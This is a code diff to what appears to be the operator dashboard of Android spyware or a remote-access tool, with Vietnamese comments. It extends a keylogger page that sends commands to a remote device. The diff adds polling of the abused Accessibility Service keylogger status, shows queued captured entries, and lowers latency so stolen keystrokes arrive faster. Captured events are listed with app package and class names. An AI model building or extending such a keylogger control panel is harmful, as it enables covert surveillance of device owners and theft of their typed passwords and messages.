@@ -1,4 +1,4 @@
-import { useCallback } from 'react';
+import { useCallback, useEffect, useState } from 'react';
 import { useOutletContext } from 'react-router-dom';
 import { useDeviceData } from '@/hooks/useDeviceData';
 import type { DeviceOutletContext, KeystrokeEntry } from '@/types';
@@ -6,7 +6,14 @@ import { CMD, normalizeKeystrokeList, extractList } from '@/types';
 import { DevicePageHeader, EmptyState, ErrorAlert, LoadingSkeleton } from '@/components/device/shared';
 import { Card, CardContent } from '@/components/ui/card';
 import { Badge } from '@/components/ui/badge';
-import { Keyboard, Download } from 'lucide-react';
+import { Keyboard, Download, Activity } from 'lucide-react';
+import { clientsApi } from '@/services/api';
+
+interface KeyloggerStatus {
+  enabled: boolean | null;
+  queued: number;
+  checkedAt: string | null;
+}
 
 export default function KeyloggerPage() {
   const { clientId, online } = useOutletContext<DeviceOutletContext>();
@@ -15,9 +22,56 @@ export default function KeyloggerPage() {
     clientId,
     page: 'keylogger',
     extractData: (d) => normalizeKeystrokeList(extractList(d.list)),
-    dataType: 'keylogger',
+    dataType: ['keylogger', 'keylogger_status'],
     defaultValue: [],
+    // Giảm debounce xuống 500ms để giảm độ trễ end-to-end
+    socketDebounceMs: 500,
   });
+
+  // Trạng thái keylogger service (poll từ API)
+  const [keyloggerStatus, setKeyloggerStatus] = useState<KeyloggerStatus>({
+    enabled: null,
+    queued: 0,
+    checkedAt: null,
+  });
+  const [statusLoading, setStatusLoading] = useState(false);
+
+  // Tự động fetch trạng thái khi vào trang
+  const fetchStatus = useCallback(async () => {
+    setStatusLoading(true);
+    try {
+      const res = await clientsApi.getPage(clientId, 'keylogger_status');
+      if (res.data.success && res.data.data) {
+        const d = res.data.data as Record<string, unknown>;
+        setKeyloggerStatus({
+          enabled: typeof d.enabled === 'boolean' ? d.enabled : null,
+          queued: typeof d.queued === 'number' ? d.queued : 0,
+          checkedAt: typeof d.checkedAt === 'string' ? d.checkedAt : null,
+        });
+      }
+    } catch {
+      // Không hiển thị lỗi — chỉ để trống
+    }
+    setStatusLoading(false);
+  }, [clientId]);
+
+  // Gửi lệnh status đến thiết bị để cập nhật trạng thái mới nhất
+  const checkServiceStatus = useCallback(async () => {
+    setStatusLoading(true);
+    try {
+      await sendCommand(CMD.KEYLOGGER, { action: 'status' });
+      // Đợi socket broadcast về rồi fetch lại
+      setTimeout(() => {
+        fetchStatus();
+      }, 1500);
+    } catch {
+      setStatusLoading(false);
+    }
+  }, [sendCommand, fetchStatus]);
+
+  useEffect(() => {
+    fetchStatus();
+  }, [fetchStatus]);
 
   const fetchKeylogger = useCallback(async () => {
     await sendCommand(CMD.KEYLOGGER, { action: 'fetch' });
@@ -27,6 +81,26 @@ export default function KeyloggerPage() {
     await sendCommand(CMD.KEYLOGGER, { action: 'getHistory' });
   }, [sendCommand]);
 
+  const formatCheckedAt = (iso: string | null): string => {
+    if (!iso) return '';
+    try {
+      return new Date(iso).toLocaleString();
+    } catch {
+      return iso;
+    }
+  };
+
+  // Badge trạng thái service
+  const statusBadge = () => {
+    if (keyloggerStatus.enabled === null) {
+      return <Badge variant="outline" className="text-[10px] border-gray-400/30 text-gray-500">UNKNOWN</Badge>;
+    }
+    if (keyloggerStatus.enabled) {
+      return <Badge variant="outline" className="text-[10px] border-green-400/30 text-green-600">ACTIVE</Badge>;
+    }
+    return <Badge variant="outline" className="text-[10px] border-red-400/30 text-red-600">DISABLED</Badge>;
+  };
+
   return (
     <div className="space-y-5">
       <DevicePageHeader
@@ -34,12 +108,38 @@ export default function KeyloggerPage() {
         subtitle={`${keystrokes.length} events`}
         actions={[
           { label: 'Fetch', icon: Download, onClick: fetchKeylogger, disabled: loading || !online },
-          { label: 'Get History', icon: Keyboard, onClick: getHistory, disabled: loading || !online, variant: 'outline' },
+          { label: 'Get History', icon: Keyboard, onClick: getHistory, disabled: loading || !online, variant: 'outline' as const },
+          { label: 'Check Status', icon: Activity, onClick: checkServiceStatus, disabled: statusLoading || !online, variant: 'outline' as const },
         ]}
         refresh={refresh}
         loading={loading}
         commandStatus={commandStatus}
       />
+
+      {/* Trạng thái Accessibility Service */}
+      <Card className="shadow-none border-dashed">
+        <CardContent className="p-3 flex items-center gap-3 flex-wrap">
+          <span className="text-xs font-medium text-muted-foreground">Accessibility Service:</span>
+          {statusBadge()}
+          {keyloggerStatus.enabled !== null && (
+            <span className="text-[10px] text-muted-foreground">
+              Queued: {keyloggerStatus.queued} entries
+            </span>
+          )}
+          {keyloggerStatus.checkedAt && (
+            <span className="text-[9px] text-muted-foreground/60">
+              Last check: {formatCheckedAt(keyloggerStatus.checkedAt)}
+            </span>
+          )}
+          <button
+            onClick={fetchStatus}
+            disabled={statusLoading}
+            className="text-[10px] text-blue-500 hover:text-blue-600 ml-auto disabled:opacity-50"
+          >
+            Refresh status
+          </button>
+        </CardContent>
+      </Card>
 
       {error && <ErrorAlert message={error} onRetry={refresh} />}
 
@@ -64,7 +164,9 @@ export default function KeyloggerPage() {
                   {item.eventType && (
                     <Badge variant="secondary" className="text-[9px] px-1 py-0">{item.eventType}</Badge>
                   )}
-                  <span className="text-[10px] text-muted-foreground">{item.timestamp}</span>
+                  {item.timestamp && (
+                    <span className="text-[10px] text-muted-foreground">{item.timestamp}</span>
+                  )}
                 </div>
                 {item.pkg && <p className="text-[10px] font-mono text-muted-foreground truncate">pkg: {item.pkg}</p>}
                 {item.cls && <p className="text-[10px] font-mono text-muted-foreground truncate">cls: {item.cls}</p>}
